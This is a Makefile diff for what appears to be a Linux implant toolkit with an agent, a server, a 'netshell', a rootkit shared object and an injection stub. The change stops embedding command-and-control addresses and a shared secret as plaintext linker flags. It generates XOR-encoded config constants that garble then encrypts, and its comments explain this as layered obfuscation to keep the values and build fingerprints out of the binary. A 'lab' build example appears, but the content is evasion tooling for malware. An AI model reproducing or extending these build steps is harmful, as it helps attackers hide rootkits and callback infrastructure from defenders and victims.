@@ -63,14 +63,11 @@ endif
 endif
 
 # ── Go build flags ──────────────────────────────────────────────────────────
-XFLAGS  := -X 'core/mon/internal/config.DefaultServer=$(SERVER)' \
-           -X 'core/mon/internal/config.FallbackServer=$(FALLBACK)' \
-           -X 'core/mon/internal/config.RawsockCBAddr=$(RAWSOCK_CB)' \
-           -X 'core/mon/internal/config.KCCAddr=$(KCC_ADDR)' \
-           -X 'core/mon/internal/config.TriggerMode=$(TRIGGER)' \
-           -X 'core/mon/internal/config.DefaultInterval=$(INTERVAL)' \
-           -X 'core/mon/internal/config.SharedSecret=$(SECRET)'
-LDFLAGS_INNER := -s -w -buildid= $(XFLAGS)
+# Config values (SERVER, SECRET, etc.) are NOT injected via -X ldflags.
+# garble -literals cannot encrypt ldflag values — they appear plaintext in the binary.
+# Instead, make genconfig generates internal/config/config_gen.go with XOR(0x5A)
+# encoded constants. garble then encrypts those constants: two layers of obfuscation.
+LDFLAGS_INNER := -s -w -buildid=
 FLAGS         := -ldflags="$(LDFLAGS_INNER)" -trimpath
 
 # garble flags: -literals encrypts all string constants, -seed per-build randomization
@@ -127,6 +124,18 @@ ROOTKIT_PAYLOAD := cmd/bat-agent/payload/rootkit.so
 INJECT_STUB     := inject/stub.bin
 INJECT_PAYLOAD  := internal/ttp/inject_stub.bin
 
+# ── genconfig ─────────────────────────────────────────────────────────────────
+# Generates internal/config/config_gen.go with XOR(0x5A)-encoded config constants.
+# Called automatically by all binary build targets.
+# Requires: SERVER, SECRET (and optionally FALLBACK, RAWSOCK_CB, KCC_ADDR, INTERVAL, TRIGGER).
+.PHONY: genconfig
+genconfig:
+	@[ -n "$(SECRET)" ] || (echo "ERROR: SECRET= required. Example: make lab RELAY=1.2.3.4 SECRET=<hex>" && exit 1)
+	@SERVER=$(SERVER) FALLBACK=$(FALLBACK) RAWSOCK_CB=$(RAWSOCK_CB) \
+	 KCC_ADDR=$(KCC_ADDR) INTERVAL=$(INTERVAL) SECRET=$(SECRET) TRIGGER=$(TRIGGER) \
+	 python3 internal/config/gen.py > internal/config/config_gen.go
+	@echo "[genconfig] internal/config/config_gen.go written"
+
 .PHONY: all x86_64 arm64 server server-amd64 server-arm64 \
         agents-amd64 agents-arm64 pack clean rootkit inject-stub \
         netshell netshell-amd64 netshell-arm64 garble-netshell garble-agent \
@@ -169,24 +178,24 @@ x86_64: agents-amd64 $(OUTDIR)/bat-server-$(VERSION)-x86_64
 arm64: agents-arm64 $(OUTDIR)/bat-server-$(VERSION)-arm64
 
 # ── Build rules ───────────────────────────────────────────────────────────────
-$(OUTDIR)/bat-server-$(VERSION)-x86_64:
+$(OUTDIR)/bat-server-$(VERSION)-x86_64: genconfig
 	GOOS=linux GOARCH=amd64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-server/
 
-$(OUTDIR)/bat-server-$(VERSION)-arm64:
+$(OUTDIR)/bat-server-$(VERSION)-arm64: genconfig
 	GOOS=linux GOARCH=arm64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-server/
 
-$(OUTDIR)/bat-agent-$(VERSION)-x86_64: $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
+$(OUTDIR)/bat-agent-$(VERSION)-x86_64: genconfig $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
 	GOOS=linux GOARCH=amd64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-agent/
 
-$(OUTDIR)/bat-agent-$(VERSION)-arm64: $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
+$(OUTDIR)/bat-agent-$(VERSION)-arm64: genconfig $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
 	GOOS=linux GOARCH=arm64 $(GO) build $(FLAGS) -o $@ ./cmd/bat-agent/
 
 # ── netshell targets ──────────────────────────────────────────────────────────
 # Standard (unobfuscated) — for dev/testing
-$(OUTDIR)/netshell-$(VERSION)-x86_64: $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
+$(OUTDIR)/netshell-$(VERSION)-x86_64: genconfig $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
 	GOOS=linux GOARCH=amd64 $(GO) build $(FLAGS) -o $@ ./cmd/netshell/
 
-$(OUTDIR)/netshell-$(VERSION)-arm64: $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
+$(OUTDIR)/netshell-$(VERSION)-arm64: genconfig $(ROOTKIT_PAYLOAD) $(INJECT_STUB)
 	GOOS=linux GOARCH=arm64 $(GO) build $(FLAGS) -o $@ ./cmd/netshell/
 
 netshell netshell-amd64: $(ROOTKIT_PAYLOAD) inject-stub $(OUTDIR)/netshell-$(VERSION)-x86_64
@@ -196,12 +205,12 @@ netshell-arm64: $(ROOTKIT_PAYLOAD) inject-stub $(OUTDIR)/netshell-$(VERSION)-arm
 # garble -literals: encrypts all string literals at compile time
 # garble -tiny: removes DWARF, reduces panic output
 # garble -seed=random: unique obfuscation per build (no reproducible binary fingerprint)
-garble-netshell: $(ROOTKIT_PAYLOAD) inject-stub
+garble-netshell: genconfig $(ROOTKIT_PAYLOAD) inject-stub
 	GOOS=linux GOARCH=amd64 $(GARBLE) $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS_INNER)" -trimpath -o $(OUTDIR)/netshell-$(VERSION)-x86_64 ./cmd/netshell/
 	GOOS=linux GOARCH=arm64 $(GARBLE) $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS_INNER)" -trimpath -o $(OUTDIR)/netshell-$(VERSION)-arm64  ./cmd/netshell/
 	@echo "[garble] netshell obfuscated builds done"
 
-garble-agent: $(ROOTKIT_PAYLOAD) inject-stub
+garble-agent: genconfig $(ROOTKIT_PAYLOAD) inject-stub
 	GOOS=linux GOARCH=amd64 $(GARBLE) $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS_INNER)" -trimpath -o $(OUTDIR)/bat-agent-$(VERSION)-x86_64 ./cmd/bat-agent/
 	GOOS=linux GOARCH=arm64 $(GARBLE) $(GARBLE_FLAGS) build -ldflags="$(LDFLAGS_INNER)" -trimpath -o $(OUTDIR)/bat-agent-$(VERSION)-arm64  ./cmd/bat-agent/
 	@echo "[garble] bat-agent obfuscated builds done"
